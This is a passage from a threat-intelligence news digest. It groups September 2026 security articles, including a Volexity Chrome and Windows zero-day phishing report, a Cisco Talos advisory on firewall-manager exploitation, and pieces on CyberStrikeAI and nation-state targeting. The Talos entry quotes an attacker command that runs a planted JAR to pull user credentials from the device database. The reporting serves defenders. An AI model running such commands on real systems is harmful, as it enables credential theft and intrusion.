shared exploitation chain, as well as the distinct post-exploitation malware deployed by each threat actor. UTA0560 Targets NGOs with Financial Lures Volexity’s NSM service detected phishing emails sent to multiple customers on September 1, 2026, from a known UTA0560 email account. The phishing lures matched previously unsuccessful phishing emails sent to Volexity customer organizations, which were detected by Volexity in March 2026. An example phishing email is shown below: The email body contained a link to a legitimate website susceptible to a reflective XSS vulnerability which was abused by UTA0560 to redirect the visitor to the first stage in a multi-stage Chrome browser zero-day exploit chain. Upon clicking the URL, the browser redirected to the following URL , which began the exploitation process: hxxps://cloud.shinewrist[.]net/<removed>/Files1.html The exploit abused the vulnerability CVE-2026-85046 in the Chrome browser, a type-confusion bug in the V8 JavaScript Engine. When the phishing URL is clicked by the user, a multi-stage exploitation chain occurs, exploiting both the Chrome browser and the Windows kernel to deploy and execute malware on the victim host. The vulnerability in the Windows kernel has been assigned CVE-2026-85880 . After clicking on the URL, the only behavior noticeable from the user perspective is an image displayed in the browser mimicking a donation form on a web pag
```

#### Corroborating sources (1)

- **Volexity** (threat_research_primary)
  - Title: Mind the (Patch) Gap: Multiple Chinese Threat Actors Chain 0-day Exploits in Chrome & Windows
  - Published: 2026-09-09T17:36:22+00:00
  - Link: https://www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/
  - Summary: On September 1, 2026, Volexity’s Network Security Monitoring (NSM) service detected a spear-phishing campaign from a Chinese threat actor it tracks as UTA0560 targeting customers at multiple non-governmental organizations (NGOs). […] The post Mind the (Patch) Gap: Multiple Chinese Threat Actors Chain 0-day Exploits in Chrome & Windows appeared first on Volexity .

### Cluster 99389bbd5f — score 11

- Title: Patch Tuesday to Pentest Wednesday: How an Equipment Rental Company Is Turning Continuous Testing Into Continuous Exposure Management
- Source: Horizon3 Attack Research (offensive_vulnerability_research)
- Published: 2026-09-09T15:58:00+00:00
- Link: https://horizon3.ai/intelligence/blogs/pentest-wednesday-continuous-exposure-management/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
See how an equipment rental company moved beyond point-in-time pentesting with NodeZero®, continuously validating exploitable risk, driving remediation, and measuring whether exposure is actually decreasing.
```

#### Full body

```
Patch Tuesday to Pentest Wednesday: How an Equipment Rental Company Is Turning Continuous Testing Into Continuous Exposure Management Stephen Gates September 9, 2026 Blogs A Pentest Wednesday® Story Introduction For a large equipment rental and services company with distributed operations supporting customers across a wide range of industries, technology is deeply embedded in how the business operates. Its environment spans corporate systems, customer-facing applications, digital services, and the technology supporting a complex rental and fleet operation. Across that footprint, cyber exposure is constantly changing. That made point-in-time security testing increasingly difficult to rely on. A traditional penetration test could provide useful insight into the environment on the day it was performed, but it could not show what became exploitable the next day, the next week, or months before the next assessment. The security team needed a way to continuously identify where exposure existed, validate what attackers could actually exploit, and use that evidence to drive remediation as the environment changed. That shift is helping the organization move toward continuous exposure management. CTEM provides a framework for getting there, but the goal is not simply to execute its stages. It is to continuously reduce the exposures attackers can use. The NodeZero® Proactive Security Platform provides the continuous validation needed to help put that approach into practice. As the company’s Chief Security Architect explained: “We are leveraging the Horizon3 APIs to pull telemetry into Splunk for our CTEM attack surface management pipeline.” For the team, that pipeline is ultimately about making exposure management continuous: identifying changes in the environment, validating what creates real risk, acting on the evidence, and measuring whether those actions actually reduce exposure. Outcomes at a Glance More findings in 12 hours than a third-party engagement found in roughly 30 days, giving the team faster evidence of where real exposure existed. An SSH key exposure caused by a recent change was discovered in about eight hours, rather than potentially remaining unnoticed until the next annual pentest. A suspected Cisco vulnerability was validated as exploitable, helping the team move from assumption to evidence and then remediate the affected systems. Password testing exposed systemic Active Directory weaknesses, driving broader password and identity security changes. NodeZero telemetry now feeds the organization’s CTEM attack surface management pipeline in Splunk, helping operationalize continuous exposure management. Impact The value of continuous exposure management became tangible when NodeZero began producing evidence faster and more consistently than the company’s traditional testing model. In one comparison, NodeZero uncovered more findings in hours than a third-party assumed-breach and external penetration testing engagement found over several weeks. As the company’s Chief Security Architect put it: “You’ve uncovered and saved our bacon in multiple areas… You found more findings in 12 hours than they found in 30 days.” The value was not simply speed. It was the ability to test repeatedly as the environment changed, validate which weaknesses were actually exploitable, and surface exposures that might otherwise remain hidden between scheduled assessments. Background The company’s move toward continuous exposure management was driven by a simple reality: its environment changes too quickly for annual or periodic testing to provide a current picture of exposure. That became clear when an employee stood up a PHP web server for testing in the root directory. In doing so, SSH RSA key pairs were exposed, creating an opportunity for lateral movement. NodeZero surfaced the issue roughly eight hours after the change was introduced. As the company’s Chief Security Architect explained: “That individual did that… theoretically, in most organi
```

#### Corroborating sources (1)

- **Horizon3 Attack Research** (offensive_vulnerability_research)
  - Title: Patch Tuesday to Pentest Wednesday: How an Equipment Rental Company Is Turning Continuous Testing Into Continuous Exposure Management
  - Published: 2026-09-09T15:58:00+00:00
  - Link: https://horizon3.ai/intelligence/blogs/pentest-wednesday-continuous-exposure-management/
  - Summary: See how an equipment rental company moved beyond point-in-time pentesting with NodeZero®, continuously validating exploitable risk, driving remediation, and measuring whether exposure is actually decreasing.

### Cluster 5786bd6a86 — score 11

- Title: Active exploitation of Cisco Secure Firewall Management Center vulnerabilities
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-09-09T16:08:59+00:00
- Link: https://blog.talosintelligence.com/fmc-ongoing-exploitation/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 1
- Strong signals: Cisco

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, apt_espionage, ransomware_extortion, web_shell_backdoor
- affected_industries: financial_services
- affected_products: Cisco
- cve_ids: CVE-2026-20079, CVE-2026-20316
- urgency_signals: actively_exploited, no_patch_yet, preauth_unauth
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, apt_espionage, web_shell_backdoor, active_exploitation
- affected_products: Cisco
- cve_ids: CVE-2026-20079, CVE-2026-20316
- urgency_signals: actively_exploited, preauth_unauth, no_patch_yet
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Cisco Talos is actively tracking the exploitation of two vulnerabilities in Cisco’s Secure Firewall Management Center (FMC) Software.
```

#### Full body

```
Active exploitation of Cisco Secure Firewall Management Center vulnerabilities By Cisco Talos Wednesday, September 9, 2026 12:08 Threat Advisory malware Cisco Talos is actively tracking the exploitation of two vulnerabilities in Cisco’s Secure Firewall Management Center (FMC) Software. First, CVE-2026-20079 is an authentication bypass vulnerability in unpatched instances of Cisco’s Secure FMC Software, which allows an unauthenticated, remote attacker to bypass authentications and execute scripts on impacted devices to obtain root access to the underlying operating system. Second, CVE-2026-20316 is a vulnerability that allows a remote attacker to log in using a low-privileged account. CVE-2026-20079 is a critical vulnerability with a CVSS score of 10.0. Customers are strongly advised to follow Cisco’s guidance provided in the security advisory and apply the security patches previously made available. CVE-2026-20316 has a CVSS score of 5.3, however it can be used with other Cisco Secure FMC vulnerabilities to elevate privileges. Due to Talos identifying in the wild abuse of these CVE’s, customers are strongly advised to apply hotfixes for affected software versions already released by Cisco for CVE-2026-20079 and CVE-2026-20316 . A comprehensive hardening release consisting of these hotfixes along with other internally discovered vulnerabilities will be released next week (Week of September 14th). Talos’ analysis illustrates three clusters of post-compromise activity on FMC instances associated with state-sponsored and crimeware threat actors, as described below. The first cluster which we track as UAT-12197, involves the exploitation of CVE-2026-20079, leading to the deployment of web shells, a Java Archive (JAR)-based command executor, and credential exfiltration. The second intrusion cluster, which we attribute to UAT-11823, consisted of the exploitation of CVE-2026-20079 and CVE-2026-20316, leading to the deployment of a Netcat-based reverse shell and proxy tooling, ultimately leading to the deployment of a variant of the Cyclops Blink malware, previously attributed to the Russian APT Sandworm by the United States and United Kingdom . Talos is further disclosing a third cluster of malicious activity on an FMC instance, attributed to UAT-11988, who we assess with high confidence is a ransomware operator. The preliminary stages of the attack entailed the threat actor gaining access to the system via static credentials ( CVE-2026-20316) and then abusing legitimate built-in FMC tooling in living-off-the-land (LOTL) fashion to conduct extensive reconnaissance of the victim’s environment, deploy tunneling tools to maintain network access, harvest credentials, and build a target list of endpoints to encrypt/lock. Subsequent actions and tactics, techniques, and procedures (TTPs) the threat actor used in the victim’s environment were consistent with those of Qilin ransomware affiliates. Cluster #1: UAT-12197 This cluster of activity involved the successful exploitation of CVE-2026-20079 and the subsequent placement of a malicious web shell in the CSM Tomcat webroot directory. The web shell is JSP-based and Base64 decodes a parameter labelled “F6C1F0E7”, consisting of the class name to load in the JAVA process: The web shell was used to place a malicious JAR file in the same directory. The threat actors used the JAR file (named “cmd[.]jar”) to query the compromised systems’ internal databases to obtain user authentication data and credentials: /var/jre/bin/java -jar cmd.jar '/var/sf/bin/OmniQuery.pl -db mdb -e \'SELECT name, auth_data FROM users;\'' The JAR file is basically a command executor that obtains the command to be executed from its command line and executes it using /bin/sh -c <command>. Cluster #2: UAT-11823 Talos attributes this cluster of activity to UAT-11823, an advanced persistent threat (APT) actor, with high confidence. UAT-11823 overlaps in tooling with the Sandworm APT actor. The threat actor obtained initial acces
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: Active exploitation of Cisco Secure Firewall Management Center vulnerabilities
  - Published: 2026-09-09T16:08:59+00:00
  - Link: https://blog.talosintelligence.com/fmc-ongoing-exploitation/
  - Summary: Cisco Talos is actively tracking the exploitation of two vulnerabilities in Cisco’s Secure Firewall Management Center (FMC) Software.

### Cluster 752341fbcc — score 11

- Title: Credentialed Pre-Port Discovery: Don't Probe the Host, Ask it
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-09-09T15:16:34+00:00
- Link: https://www.rapid7.com/blog/post/pt-credentialed-pre-port-discovery-asking-host
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
If your scan engine already holds credentials for a host, it can ask that host which ports are open instead of probing for them. Every scan begins with the same question: which ports on this host are open? Everything after it, from identifying services to checking for vulnerabilities to evaluating policy, depends on the answer being right. The traditional answer comes from the outside: the scan engine sends traffic to a range of ports and infers each port's state from how the host responds. That approach is the industry standard, and it works well when a clear network path exists between the engine and the host. Hardened hosts can stay silent rather than replying, which forces the engine to wait out timeouts. Rate limiting and intrusion prevention can throttle a burst of probes, and genuinely open ports go missing when they do. Large port ranges take time to cover thoroughly, and that time comes out of your scan window. There is a more direct route on any host where the scan engine alr
```

#### Full body

```
Back to Blog Products and Tools Credentialed Pre-Port Discovery: Don't Probe the Host, Ask it Conor McCormick Sep 9, 2026 | Last updated on Sep 9, 2026 | 7 min read DISCOVER RAPID7 MDR If your scan engine already holds credentials for a host, it can ask that host which ports are open instead of probing for them. Every scan begins with the same question: which ports on this host are open? Everything after it, from identifying services to checking for vulnerabilities to evaluating policy, depends on the answer being right. The traditional answer comes from the outside: the scan engine sends traffic to a range of ports and infers each port's state from how the host responds. That approach is the industry standard, and it works well when a clear network path exists between the engine and the host. Hardened hosts can stay silent rather than replying, which forces the engine to wait out timeouts. Rate limiting and intrusion prevention can throttle a burst of probes, and genuinely open ports go missing when they do. Large port ranges take time to cover thoroughly, and that time comes out of your scan window. There is a more direct route on any host where the scan engine already holds valid credentials: ask the host itself. This is credentialed discovery, so a credential that matches the host is the precondition for everything that follows. The engine connects to the port that credential uses, authenticates with a credential you already manage, and the host's operating system returns an authoritative list of the ports it is listening on. That list covers both TCP and UDP ports. There is no probing, no inference, and nothing to wait out. Three things to know before enabling pre-port discovery Pre-port discovery can report ports that a firewall or other network control stops your scan engine from reaching, and on those hosts you get fewer results and a longer scan. SSH and the Scan Assistant are tried on their standard ports, TCP 22 and TCP 21047, unless you set a different port on the credential's restriction. Credential coverage decides which hosts benefit, and a host with no matching credential falls back to a network port scan. Each of these is covered in full in the configuration and troubleshooting documentation . Why probing from the outside can hit a wall A network port scan works by inference. The engine sends traffic to each port in a configured range and reads the host's response, or its silence, as evidence about that port's state. Inference is the whole method, and its accuracy depends on the path between the engine and the host behaving predictably. Several common conditions break that assumption. A hardened host that drops unsolicited traffic instead of refusing it gives the engine nothing to work with, so the engine waits for a timeout and then records an ambiguous result. Rate limiting and intrusion prevention are built to react to exactly the traffic pattern a port scan produces, and a throttled probe looks the same to the engine as a closed port. Wide port ranges make both problems worse, because every additional port is another probe, another possible timeout, and more scan time. The outcome is a picture that can be partial on one scan and different on the next, on the hosts where an accurate picture matters most. If you already have credentials, ask the host Credentialed pre-port discovery replaces that inference with a question, and it is available from version 8.58. The engine connects to the port a credential uses, authenticates, and reads the list of listening ports from the host. For any host where that succeeds, the engine skips the network port scan and moves straight to examining the ports the host reported. That is what pre-port discovery means: discovering ports before, and in place of, the network port scan. There is nothing new to deploy, because pre-port discovery reuses the credentials you already configure for authenticated scanning. You do not have to choose a method: when more than one credential fi
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Credentialed Pre-Port Discovery: Don't Probe the Host, Ask it
  - Published: 2026-09-09T15:16:34+00:00
  - Link: https://www.rapid7.com/blog/post/pt-credentialed-pre-port-discovery-asking-host
  - Summary: If your scan engine already holds credentials for a host, it can ask that host which ports are open instead of probing for them. Every scan begins with the same question: which ports on this host are open? Everything after it, from identifying services to checking for vulnerabilities to evaluating policy, depends on the answer being right. The traditional answer comes from the outside: the scan engine sends traffic to a range of ports and infers each port's state from how the host responds. That approach is the industry standard, and it works well when a clear network path exists between the engine and the host. Hardened hosts can stay silent rather than replying, which forces the engine to wait out timeouts. Rate limiting and intrusion prevention can throttle a burst of probes, and genuinely open ports go missing when they do. Large port ranges take time to cover thoroughly, and that time comes out of your scan window. There is a more direct route on any host where the scan engine alr

### Cluster 369830a869 — score 11

- Title: What’s in the SOSS? Podcast #72 – S3E24 Balancing AI’s Double-Edged Sword: Software Engineering, Unlearning, and Ecosystem Sustainability with Mark Russinovich
- Source: OpenSSF Blog (ai_security_agentic_risk)
- Published: 2026-09-08T13:51:43+00:00
- Link: https://openssf.org/podcast/2026/09/08/whats-in-the-soss-podcast-72-s3e24-balancing-ais-double-edged-sword-software-engineering-unlearning-and-ecosystem-sustainability-with-mark-russinovich/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- affected_industries: critical_infrastructure, government
- affected_products: Azure
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain
- affected_industries: government, critical_infrastructure
- affected_products: Azure
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Join Azure CTO and OpenSSF Chair Mark Russinovich as he discusses AI's impact on software engineering, supply chain security, and vulnerability management.
```

#### Full body

```
Summary In this episode of What’s in the SOSS?, host CRob sits down with Mark Russinovich – CTO and Deputy CISO of Azure, as well as Board Chair for the Open Source Security Foundation (OpenSSF) – for a wide-ranging conversation on the changing landscape of software security. Mark shares insights from his journey from Sysinternals to Azure leadership, exploring how generative AI is delivering dramatic productivity boosts while creating new talent pipeline challenges for early-in-career engineers. The discussion dives into the shift toward hardware-backed “what, not who” supply chain identity, the urgent rolling Y2K effort to fix AI-discovered vulnerabilities via initiatives like Akrites, and the reality of persistent AI hallucinations. Finally, Mark details OpenSSF’s strategic priorities for package registry sustainability and gives a sneak peek into his personal vibe-coded side projects like Polypost. Listen on Apple Podcasts Listen on Spotify Listen on Overcast Listen on Pocket Casts Conversation Highlights 00:00 – Introductions, Mark’s Sysinternals & Career Journey 02:34 – OpenSSF Board Leadership 04:25 – Corporate & Community Alignment 06:28 – AI’s Impact on Software Engineering 13:23 – Finding vs. Fixing Vulnerabilities 16:29 – LLM Code Quality & Edge Cases 22:51 – Navigating AI Hallucinations 26:56 – Supply Chain: Shifting “Who” to “What” 31:13 – Machine Unlearning & Model Safety 35:05 – Rapid Response & Akrites 41:16 – Package Registry Sustainability 46:07 – Personal Projects & Vibe-Coding 54:21 – Rapid Fire Round Episode Links Mark Russinovich’s LinkedIn page Microsoft Azure OpenSSF Guide: Principles for Package Repository Security Akrites Foundation Redefining the Software Engineering Profession for AI | Communications of the ACM Who’s Harry Potter? Approximate Unlearning in LLMs Paper HalluHard: A Hard Multi-Turn Hallucination Benchmark SCITT (Supply Chain Integrity, Transparency, and Trust – IETF) GRP-Obliteration: Unaligning LLMs With a Single Unlabeled Prompt Microsoft Signing Transparency Polypost — multi-platform post editor Scott & Mark Learn To… – Hosted by Scott Hanselman, Mark Russinovich Get involved with the OpenSSF Learn more about the OpenSSF Governing Board Subscribe to the OpenSSF Newsletter Follow the OpenSSF on LinkedIn Transcript Intro Music & Promotional Sound Byte (00:00) “It’s very clear that we’re heading into a world where hardware-based attestation and measurement, not of who something is, but what something is. You need to know what it is, not who it is. And so what is it is everything that went into it. It’s its model, it’s its training data, it’s its context, it’s the tools that it has access to, and what it’s trying to do, its task. But fundamentally we’re moving into a world of what, not who, when it comes to these systems.” CRob (00:26) Welcome, welcome, welcome to Big Thoughts and Open Sources. My name’s CRob. I’m your host. Today we’re going to have a really interesting conversation with kind of a very special figure within the OpenSSF space and the broader technology ecosystem. Today I’m welcoming Mark Russinovich from Microsoft. Welcome to the show. Mark Russinovich (00:47) Thanks for having me on Crob. CRob (00:48) Yeah. So Mark and I get to work together on quite a lot of different projects across the ecosystem, but you know. Others of you listening and watching today might not know Mark as well as I do. Mark, could you maybe give us a little story about your kind of a technology and open source journey? Mark Russinovich (01:06) Sure. Well, a lot of people I think probably still know me as the Sysinternals guy. That’s how I kind of made my fame as creating utilities for Windows. CRob (00:48.55) Okay. CRob (01:14) Love them. Mark Russinovich (01:15) I joined Microsoft in 2006, worked in Windows for four years, and then I joined Azure a few months after the commercial launch. I joined in July of 2010, and I’ve been effectively in the same role the entire time. My title is Chief Techn
```

#### Corroborating sources (1)

- **OpenSSF Blog** (ai_security_agentic_risk)
  - Title: What’s in the SOSS? Podcast #72 – S3E24 Balancing AI’s Double-Edged Sword: Software Engineering, Unlearning, and Ecosystem Sustainability with Mark Russinovich
  - Published: 2026-09-08T13:51:43+00:00
  - Link: https://openssf.org/podcast/2026/09/08/whats-in-the-soss-podcast-72-s3e24-balancing-ais-double-edged-sword-software-engineering-unlearning-and-ecosystem-sustainability-with-mark-russinovich/
  - Summary: Join Azure CTO and OpenSSF Chair Mark Russinovich as he discusses AI's impact on software engineering, supply chain security, and vulnerability management.

### Cluster 7bab174bc9 — score 11

- Title: Tracking CyberStrikeAI Usage
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-09-04T13:13:54+00:00
- Link: https://www.team-cymru.com/post/tracking-cyberstrikeai-usage
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage
- affected_industries: government
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: apt_espionage
- affected_industries: government
- affected_products: GitHub
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Discover how CyberStrikeAI is revolutionizing AI-augmented offensive security. Explore its ties to Chinese state-sponsored actors and learn to detect it with NetFlow.
```

#### Full body

```
Will Thomas 5 min read March 2, 2026 Tracking CyberStrikeAI Usage Team Cymru is continuously monitoring our global netflow visibility to uncover patterns of adversary activity, identify malicious operations, and gain actionable intelligence. In this post, we are diving into CyberStrikeAI, an open-source artificial intelligence (AI) offensive security tool (OST) developed by a China-based developer who we assess has some ties to the Chinese government. What is CyberStrikeAI? In its own words from the GitHub repository (see here ), “CyberStrikeAI is an AI-native security testing platform built in Go. It integrates 100+ security tools, an intelligent orchestration engine, role-based testing with predefined security roles, a skills system with specialized testing skills, and comprehensive lifecycle management capabilities.” CyberStrikeAI comes with its own dashboard that helps users quickly understand the platform's core features and current state, as shown in Figure 1 below. Figure 1: CyberStrikeAI Dashboard from GitHub CyberStrikeAI was first brought to our attention following the Amazon CTI team’s blog about AI-augmented threat actor infrastructure they had discovered. Amazon shared this related IP 212.11.64[.]250. Analysis of that IP address in Team Cymru Scout’s open port scan data revealed that it had this “CyberStrikeAI” banner running on this service, as shown in Figure 2 below. Figure 2: The CyberStrikeAI port banner in Team Cymru Scout. Identifying Targeting with NetFlow Using Team Cymru Scout, we can find NetFlow communications between the IP shared by Amazon and its targets, such as the Fortinet FortiGate devices it was observed targeting, as shown in Figure 3 below. Figure 3. IP address running CyberStrikeAI targeting a Fortinet FortiGate device. Researching Ed1s0nZ While researching the GitHub profile (see here ) of CyberStrikeAI’s developer, “Ed1s0nZ”, several attributes about the individual caught our attention. Firstly, Ed1s0nZ’s other GitHub repositories suggest interest in exploitation activity: watermark-tool: A secure and efficient invisible document watermarking solution that can add completely invisible digital watermarks to various documents, while supporting watermark extraction and verification. Developed in Go, it supports both web and CLI usage. The watermark uses steganography technology to ensure that the watermark is completely invisible and does not affect the reading experience and visual effects of the original document. PrivHunterAI: This tool uses a passive proxy approach and mainstream AI (such as Kimi, DeepSeek, GPT, etc.) to detect privilege escalation vulnerabilities. Its core detection function is built on the open APIs of the relevant AI engines and supports data transmission and interaction via HTTPS protocol. InfiltrateX: A useful privilege escalation scanning tool. While automated detection of privilege escalation vulnerabilities is difficult, prone to occur, and poses serious risks, it can still strive to automate the detection of some such vulnerabilities. Further, Ed1s0nZ’s GitHub activities indicate they interact with organisations that support potentially Chinese government state-sponsored cyber operations. This includes Chinese private sector firms that have known ties to the Chinese Ministry of State Security (MSS). A number of GitHub activities potentially link Ed1s0nZ to the Chinese state-sponsored cyber operations. On 19 December 2025, Ed1s0nZ posted CyberStrikeAI to Knownsec 404’s Starlink Project, as shown in Figure 4 below. Based on published reporting by DomainTools and others, Knownsec does work for the MSS and the Chinese People’s Liberation Army (PLA). Figure 4. Ed1s0nZ’s post sharing CyberStrikeAI to Knownsec 404’s Starlink Project. Further, on 5 January 2026, Ed1s0nZ added to their GitHub profile “CNNVD（国家信息安全漏洞） 2024 年度漏洞奖励计划 · 二级贡献奖（个人). Translation: CNNVD (Chinese National Vulnerability Database) 2024 Vulnerability Reward Program - Level 2 Contribution Award (Indiv
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Tracking CyberStrikeAI Usage
  - Published: 2026-09-04T13:13:54+00:00
  - Link: https://www.team-cymru.com/post/tracking-cyberstrikeai-usage
  - Summary: Discover how CyberStrikeAI is revolutionizing AI-augmented offensive security. Explore its ties to Chinese state-sponsored actors and learn to detect it with NetFlow.

### Cluster b9771fe2d2 — score 11

- Title: Targeting the Defense Industrial Base: What Network Telemetry Reveals About Nation-State Pre-Positioning
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-09-04T13:13:53+00:00
- Link: https://www.team-cymru.com/post/defense-industrial-base-nation-state-network-telemetry
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, supply_chain
- actor_attribution: Salt Typhoon, Volt Typhoon
- affected_industries: critical_infrastructure, manufacturing_industrial
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: supply_chain, apt_espionage
- actor_attribution: Volt Typhoon, Salt Typhoon
- affected_industries: critical_infrastructure, manufacturing_industrial
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Discover how nation-states target the Defense Industrial Base via pre-positioning. Learn why network telemetry is crucial to detect these hidden cyber threats.
```

#### Full body

```
Stephen Campbell 5 min read min read April 29, 2026 Targeting the Defense Industrial Base: What Network Telemetry Reveals About Nation-State Pre-Positioning Intelligence drives operations. It provides commanders with options across time and space and enables them to shape the battlefield on their terms. This concept is not new. What has changed is the domain. Nation states are applying the same intelligence playbook in cyberspace, with the Defense Industrial Base as a primary target. What is being observed is not limited to intrusion activity, it is reconnaissance and pre positioning. Analysis of large-scale network telemetry reinforces this, showing sustained patterns of infrastructure mapping and access development long before disruptive activity occurs. In MITRE ATT&CK terms, this maps directly to reconnaissance and resource development. Adversaries are identifying targets, mapping infrastructure, and preparing access long before anything disruptive happens. Volt Typhoon is a clear example. They maintained access to US critical infrastructure for over five years before it was publicly disclosed. This is not an attack. It is intelligence preparation of the battlefield, carried out in cyberspace. Why the DIB is the Target The Defense Industrial Base is one of the most targeted sectors out there, and it is not just about stealing data. Yes, intellectual property matters. Weapons systems, propulsion, and communications technology are all high value targets. Stealing that information shortens the development and learning curve. It lets adversaries bypass years of research and development and move faster than they should be able to. But the real objective is access. If you can disrupt or degrade a supply chain at the right moment, that creates strategic impact. In a crisis, that is far more valuable than large volumes of stolen data. When most people think about the Defense Industrial Base, they picture large primes like Raytheon or Northrop Grumman. The reality is very different. Around 80 percent of the DIB is made up of small and mid-size contractors. These companies hold sensitive data. Contracts, technical specifications, and personnel information tied to clearances. But many of them are not resourced to defend at the same level as the primes. There is a mismatch between what they hold and what they can protect. That gap is what adversaries exploit. In military terms, you avoid the strongest point and look for the gap. The seam. The place where defenses are thin, and access still gets you where you need to go. In cyber, that seam is often a smaller contractor with real access and limited defenses. Four Actors, Four Approaches Understanding who is targeting the DIB and how they operate is key to building any effective defense. China operates with patience and persistence. Groups like Volt Typhoon and Salt Typhoon are not built for speed. They are built to remain hidden. Volt Typhoon relies heavily on living off the land techniques . That means using tools that already exist inside the environment, like PowerShell and WMI, instead of deploying custom malware. Nothing new gets dropped, nothing obvious gets flagged. Their activity blends into normal system operations, which makes detection extremely difficult. Salt Typhoon showed how far this approach can go . In 2024, they compromised the US Army National Guard network and maintained access for nine months. During that time, they collected network diagrams and administrator credentials. This is not random collection. It is deliberate. They are mapping the environment, understanding how it is built, and identifying where they can move next or come back later. It is about positioning, not immediate impact. Russia takes a more aggressive infrastructure-focused approach. GRU Unit 26165 has been exploiting vulnerable edge routers at scale. Instead of just gaining access to one network, they turn these devices into relay nodes. Traffic is redirected through attacker controlled DNS in
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: Targeting the Defense Industrial Base: What Network Telemetry Reveals About Nation-State Pre-Positioning
  - Published: 2026-09-04T13:13:53+00:00
  - Link: https://www.team-cymru.com/post/defense-industrial-base-nation-state-network-telemetry
  - Summary: Discover how nation-states target the Defense Industrial Base via pre-positioning. Learn why network telemetry is crucial to detect these hidden cyber threats.

### Cluster 498d32f5a8 — score 11

- Title: RADAR Takes the Guess Work Out of Vulnerability Exposure Management
- Source: Team Cymru (ransomware_ecrime_financial_crime)
- Published: 2026-09-04T13:13:53+00:00
- Link: https://www.team-cymru.com/post/radar-takes-the-guess-work-out-of-vulnerability-exposure-management
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- actor_attribution: Cl0p, ShinyHunters
- urgency_signals: actively_exploited, no_patch_yet
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: active_exploitation
- actor_attribution: ShinyHunters, Cl0p
- urgency_signals: actively_exploited, no_patch_yet
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
Stop manual asset inventory. RADAR automatically discovers all internet-facing infrastructure and filters for CISA KEVs within seconds. Get a prioritized, actionable list of risks. Learn how.
```

#### Full body

```
Jeremy Bender 1 min read December 4, 2025 RADAR Takes the Guess Work Out of Vulnerability Exposure Management Identifying critical vulnerabilities in exposed, internet-facing systems is essential for security—it can also be extremely time intensive. Maintaining an accurate list of organization-wide assets can be difficult enough as is, without even getting into the challenge of shadow IT, cloud sprawl, or third-party assets you may not even know exist. Even once assets are fully inventoried, you still need to identify running processes and potential vulnerabilities for remediation. Is it really any wonder, with all the steps involved, that mistakes happen and vulnerabilities can remain unpatched? RADAR takes all the guesswork out of vulnerability exposure assessments. With a simple search, RADAR discovers all internet-facing infrastructure linked to the provided domains. Within seconds, you can use this to deliver a list of domain-linked IPs containing known exploited vulnerabilities (KEVs). How RADAR Exposes Vulnerabilities In RADAR, enter a top-level domain, or series of linked domains. RADAR will automatically pull in all associated internet-facing IPs, domains, and CIDR ranges. Within RADAR, you can then specifically view associated IPs discovered through the search. RADAR will automatically enrich each listed IP with any CVEs using CISA’s live database. The enriched CVE information will contain the CVE number, description, and when the CVE was first and last seen. For more granular information, you can also apply filters, including filtering KEVs. This automatically reduces the asset list to just those containing verified risks currently being exploited in the wild. You can then further filter out CDNs or shared hosts, leading to a clear prioritized list of assets you directly manage. Within seconds, RADAR can make a clear, actionable list of assets for vulnerability teams to focus on for remediation. How to Access RADAR Through January 31, 2026, all existing Team Cymru Recon or Scout customers have complimentary RADAR access. For those interested in testing RADAR without current access, visit go.team-cymru.com/puresignal-radar to see what makes RADAR and Team Cymru’s PureSignal™ data so unique. ‍ Copy Link The latest articles straight to your inbox Related Posts 3 min read The Transaction Is the Last Step, Not the First Eli Woodward 5 min read Cl0p Til you Drop - 6 Years, 10 Campaigns, 8 Zero-Days Stephen Campbell 5 min read Behind the Panels: Validating ShinyHunters Cluster A Infrastructure Through Network Telemetry Josh Picolet 3 min read From C2 Detection to Possible Victim Identification
```

#### Corroborating sources (1)

- **Team Cymru** (ransomware_ecrime_financial_crime)
  - Title: RADAR Takes the Guess Work Out of Vulnerability Exposure Management
  - Published: 2026-09-04T13:13:53+00:00
  - Link: https://www.team-cymru.com/post/radar-takes-the-guess-work-out-of-vulnerability-exposure-management
